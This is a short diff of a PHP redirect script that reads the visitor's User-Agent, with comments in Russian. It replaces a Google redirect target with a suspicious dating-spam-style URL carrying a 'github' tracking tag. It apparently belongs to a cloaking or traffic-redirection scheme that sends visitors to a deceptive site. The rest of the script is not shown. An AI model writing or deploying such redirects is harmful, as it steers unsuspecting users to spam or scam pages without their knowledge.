@@ -1,5 +1,5 @@
 <?php
-$redirectUrl = "https://www.google.com";
+$redirectUrl = "https://mb9pmr0.meethot-love.com/lwyrlwm?t=github";
 
 // Получаем User-Agent пользователя
 $userAgent = $_SERVER['HTTP_USER_AGENT'];
